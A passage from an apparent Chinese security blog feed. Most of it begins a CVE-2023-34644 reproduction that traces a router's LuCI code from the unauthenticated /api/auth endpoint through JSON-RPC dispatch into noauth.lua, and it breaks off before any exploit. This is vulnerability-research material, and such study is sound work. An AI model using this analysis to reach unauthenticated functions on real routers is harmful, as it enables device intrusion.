class="line">irt()</span><br></pre></td></tr></table></figure><p>注意栈平衡，听说也可以打修改got.plt来shellcode，不过感觉是要再写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;刷题记录3&quot;&gt;&lt;a href=&quot;#刷题记录3&quot; class=&quot;headerlink&quot; title=&quot;刷题记录3&quot;&gt;&lt;/a&gt;刷题记录3&lt;/h1&gt;&lt;h1 id=&quot;GDOUCTF-2023-Random&quot;&gt;&lt;a href=&quot;#GDOUCTF-2023-Random&quot; c</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>路由器的文件系统与提取</title>
    <link href="http://s1nec-1o.github.io/2024/06/11/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%8F%90%E5%8F%96/"/>
    <id>http://s1nec-1o.github.io/2024/06/11/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%8F%90%E5%8F%96/</id>
    <published>2024-06-11T09:08:17.000Z</published>
    <updated>2024-06-11T09:08:17.353Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>mips-shellcode</title>
    <link href="http://s1nec-1o.github.io/2024/06/11/mips-shellcode/"/>
    <id>http://s1nec-1o.github.io/2024/06/11/mips-shellcode/</id>
    <published>2024-06-11T09:06:01.000Z</published>
    <updated>2024-06-11T09:06:01.137Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2023-34644复现</title>
    <link href="http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-29T16:35:54.000Z</published>
    <updated>2024-05-29T16:38:08.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-34644"><a href="#CVE-2023-34644" class="headerlink" title="CVE-2023-34644"></a>CVE-2023-34644</h1><h2 id="luci框架和lua文件"><a href="#luci框架和lua文件" class="headerlink" title="luci框架和lua文件"></a>luci框架和lua文件</h2><p><code>/etc/config/luci</code>通常是luci框架的配置文件，<code>/usr/lib/lua/luci</code> 通常是 LuCI 框架的核心文件所在的目录</p><p>Luci采用的是MVC的Web框架，即<strong>Model、View、Controller</strong>。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/lua/luci/controller/   <span class="comment">--控制层 </span></span><br><span class="line">/usr/lib/lua/luci/view/ <span class="comment">--视图层</span></span><br><span class="line">/usr/lib/lua/luci/model/cbi/<span class="comment">--模型层</span></span><br></pre></td></tr></table></figure><p>未授权的漏洞，那么首先就要找到无鉴权的<code>API</code>接口，定位到<code>/usr/lib/lua/luci/controller/eweb/api.lua</code>文件。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- API集合</span></span><br><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.controller.eweb.api&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticator</span><span class="params">(validator)</span></span></span><br><span class="line">        <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">        <span class="keyword">local</span> sid = http.formvalue(<span class="string">&quot;auth&quot;</span>, <span class="literal">true</span>) <span class="keyword">or</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sid <span class="keyword">then</span> <span class="comment">-- if authentication token was given</span></span><br><span class="line">            <span class="keyword">local</span> sauth = <span class="built_in">require</span> <span class="string">&quot;luci.sauth&quot;</span></span><br><span class="line">            sid = sid:<span class="built_in">match</span>(<span class="string">&quot;^[a-f0-9]*$&quot;</span>)</span><br><span class="line">            <span class="keyword">local</span> sdat = sauth.<span class="built_in">read</span>(sid)</span><br><span class="line">            <span class="keyword">if</span> sdat <span class="keyword">then</span> <span class="comment">-- if given token is valid</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(sdat) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span> <span class="comment">-- and sdat.rip == http.getenv(&quot;REMOTE_ADDR&quot;) then</span></span><br><span class="line">                    <span class="keyword">return</span> sdat</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">        <span class="keyword">local</span> _ok, _auth = tool.doCheck()</span><br><span class="line">        <span class="keyword">if</span> _ok <span class="keyword">and</span> _auth <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> &#123;sid = _auth, token = _auth&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="comment">-- 执行代理请求失败时，不退出主设备的</span></span><br><span class="line">        <span class="comment">-- 场景：在AP列表代理配置AP去重启设备，重启完成后AP的session没了但是不要退出主设备的EWEB</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">string</span>.<span class="built_in">match</span>(http.<span class="built_in">getenv</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>, <span class="string">&quot;^.+/snos_red_%d+\.%d+\.%d+\.%d+/.+&quot;</span>) <span class="keyword">then</span></span><br><span class="line">            tool.logout()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        http.<span class="built_in">status</span>(<span class="number">403</span>, <span class="string">&quot;Forbidden Api&quot;</span>)</span><br><span class="line">        http.write_json(&#123;code = <span class="number">2</span>, msg = <span class="string">&quot;403 Forbidden, auth is not passed&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> api = node(<span class="string">&quot;api&quot;</span>)</span><br><span class="line">    api.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    api.sysauth_authenticator = authenticator</span><br><span class="line">    api.notemplate = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;auth&quot;</span>&#125;, call(<span class="string">&quot;rpc_auth&quot;</span>), <span class="literal">nil</span>).sysauth = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;common&quot;</span>&#125;, call(<span class="string">&quot;rpc_common&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;cmd&quot;</span>&#125;, call(<span class="string">&quot;rpc_cmd&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;system&quot;</span>&#125;, call(<span class="string">&quot;rpc_system&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;diagnose&quot;</span>&#125;, call(<span class="string">&quot;rpc_diagnose&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;overview&quot;</span>&#125;, call(<span class="string">&quot;rpc_overview&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;network&quot;</span>&#125;, call(<span class="string">&quot;rpc_network&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;wireless&quot;</span>&#125;, call(<span class="string">&quot;rpc_wireless&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;download&quot;</span>&#125;, call(<span class="string">&quot;down_file&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;switch&quot;</span>&#125;, call(<span class="string">&quot;rpc_switch&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;openvpn&quot;</span>&#125;, call(<span class="string">&quot;openvpn&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>还有一些模块的定义，上述可以分为<strong>模块声明</strong>和<strong>路由定义</strong>，其中模块声明中</p><ul><li><code>module(&quot;luci.controller.eweb.api&quot;, package.seeall)</code>：定义一个名为 <code>luci.controller.eweb.api</code> 的模块，并导出所有函数。</li></ul><p>路由定义中</p><ul><li><code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code>：注册 <code>/api/auth</code> 路径，调用 <code>rpc_auth</code> 函数处理请求，并禁用系统认证。</li></ul><p>根据其中调用的rpc_auth函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 认证模块</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>引入了必要的模块</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line"><span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line"><span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br></pre></td></tr></table></figure><ul><li><code>jsonrpc</code>：用于处理 JSON-RPC 请求。</li><li><code>http</code>：用于处理 HTTP 请求和响应。</li><li><code>ltn12</code>：用于处理数据流。</li><li><code>_tbl</code>：假设是一个包含无认证功能的模块（<code>noauth</code>），用于处理实际的 JSON-RPC 方法。</li></ul><p>因此定位到对应的处理文件&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;modules&#x2F;noauth.lua</p><p>然后再看luci.utils.jsonrpc</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">LuCI - Lua Configuration Interface</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Copyright 2008 Steven Barth &lt;steven@midlink.org&gt;</span></span><br><span class="line"><span class="comment">Copyright 2008 Jo-Philipp Wich &lt;xm@leipzig.freifunk.net&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$Id$</span></span><br><span class="line"><span class="comment">]]</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.utils.jsonrpc&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> decoder = luci.json.Decoder()</span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">local</span> response</span><br><span class="line">    <span class="keyword">local</span> success = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32601</span>, message = <span class="string">&quot;Method not found.&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32600</span>, message = <span class="string">&quot;Invalid request.&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        response = reply(<span class="string">&quot;2.0&quot;</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, &#123;code = <span class="number">-32700</span>, message = <span class="string">&quot;Parse error.&quot;</span>, err = err&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reply</span><span class="params">(jsonrpc, id, res, err)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    id = id <span class="keyword">or</span> luci.json.null</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 1.0 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> jsonrpc ~= <span class="string">&quot;2.0&quot;</span> <span class="keyword">then</span></span><br><span class="line">        jsonrpc = <span class="literal">nil</span></span><br><span class="line">        res = res <span class="keyword">or</span> luci.json.null</span><br><span class="line">        err = err <span class="keyword">or</span> luci.json.null</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="comment">-- if type(res) == &quot;string&quot; then</span></span><br><span class="line">    <span class="comment">--     res = luci.json.decode(res) or res</span></span><br><span class="line">    <span class="comment">-- end</span></span><br><span class="line">    <span class="keyword">return</span> &#123;id = id, data = res, <span class="built_in">error</span> = err, jsonrpc = jsonrpc, code = <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span><span class="params">(method, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> res = &#123;luci.util.copcall(method, ...)&#125;</span><br><span class="line">    <span class="keyword">local</span> stat = <span class="built_in">table</span>.<span class="built_in">remove</span>(res, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> stat <span class="keyword">then</span></span><br><span class="line">        tool.<span class="built_in">debug</span>(<span class="string">&quot;[&quot;</span> .. <span class="built_in">os</span>.<span class="built_in">date</span>() .. <span class="string">&quot; -s]&quot;</span> .. <span class="string">&quot;=====      RPC ERROR LOG&quot;</span>, &#123;params = ...&#125;)</span><br><span class="line">        <span class="comment">-- return nil, &#123;code = -32602, data = &quot;jsonrpc:81&quot;, params = ..., res = res&#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, &#123;code = <span class="number">-32602</span>, data = <span class="string">&quot;jsonrpc:81&quot;</span>, res = res&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> #res &lt;= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> res[<span class="number">1</span>] <span class="keyword">or</span> luci.json.null</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tool.<span class="built_in">debug</span>(<span class="string">&quot;[&quot;</span> .. <span class="built_in">os</span>.<span class="built_in">date</span>() .. <span class="string">&quot; -s]&quot;</span> .. <span class="string">&quot;=====      RPC ERROR LOG&quot;</span>, &#123;params = ...&#125;)</span><br><span class="line">            <span class="comment">-- return &#123;code = -32603, data = &quot;jsonrpc:89&quot;, params = ..., res = res&#125;</span></span><br><span class="line">            <span class="keyword">return</span> &#123;code = <span class="number">-32603</span>, data = <span class="string">&quot;jsonrpc:89&quot;</span>, res = res&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>四个函数分别的作用是</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resolve(<span class="built_in">mod</span>, method)： <span class="comment">---解析模块 mod 中的方法 method。</span></span><br><span class="line">handle(tbl, rawsource, ...)： <span class="comment">---处理 JSON-RPC 请求。</span></span><br><span class="line">reply(jsonrpc, id, res, err)： <span class="comment">---生成 JSON-RPC 响应。</span></span><br><span class="line">proxy(method, ...)： <span class="comment">---代理执行 JSON-RPC 方法。</span></span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> decoder = luci.json.Decoder()</span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">local</span> response</span><br><span class="line">    <span class="keyword">local</span> success = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32601</span>, message = <span class="string">&quot;Method not found.&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32600</span>, message = <span class="string">&quot;Invalid request.&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        response = reply(<span class="string">&quot;2.0&quot;</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, &#123;code = <span class="number">-32700</span>, message = <span class="string">&quot;Parse error.&quot;</span>, err = err&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>着重看中间部分：</p><ul><li>使用 <code>resolve</code> 函数解析method，找到对应的 Lua 函数。</li><li>如果找到方法，使用<code>proxy</code>函数调用方法，并生成响应。<ul><li><code>proxy(method, json.params or &#123;&#125;)</code>：调用方法并传递参数。</li><li><code>reply(json.jsonrpc, json.id, ...)</code>：生成 JSON-RPC 响应。</li></ul></li><li>如果未找到方法，生成错误响应，错误码 <code>-32601</code> 表示 “Method not found”。</li></ul><p>代码细节：</p><ul><li><p><code>resolve</code> 函数用于解析方法名，找到对应的 Lua 函数。</p></li><li><p>它将方法名按 <code>.</code> 分割成路径，然后逐级查找对应的表，最终找到方法。</p></li><li><p><code>reply</code> 函数用于生成 JSON-RPC 响应。</p></li><li><p>它根据 JSON-RPC 版本和请求 ID 生成响应对象。</p></li><li><p><code>proxy</code> 函数用于安全调用方法，并处理可能的错误。</p></li><li><p>它使用 <code>luci.util.copcall</code> 捕获调用中的错误，并根据调用结果生成响应。</p></li></ul><p>可以得知这里<strong>通过<code>JSON</code>数据的<code>method</code>字段定位并调用<code>noauth.lua</code>中对应的函数，同时将<code>Json</code>数据的<code>params</code>字段内容作为参数传入</strong></p><h3 id="分析noauth-lua-寻找可疑漏洞的入口"><a href="#分析noauth-lua-寻找可疑漏洞的入口" class="headerlink" title="分析noauth.lua(寻找可疑漏洞的入口)"></a>分析noauth.lua(寻找可疑漏洞的入口)</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 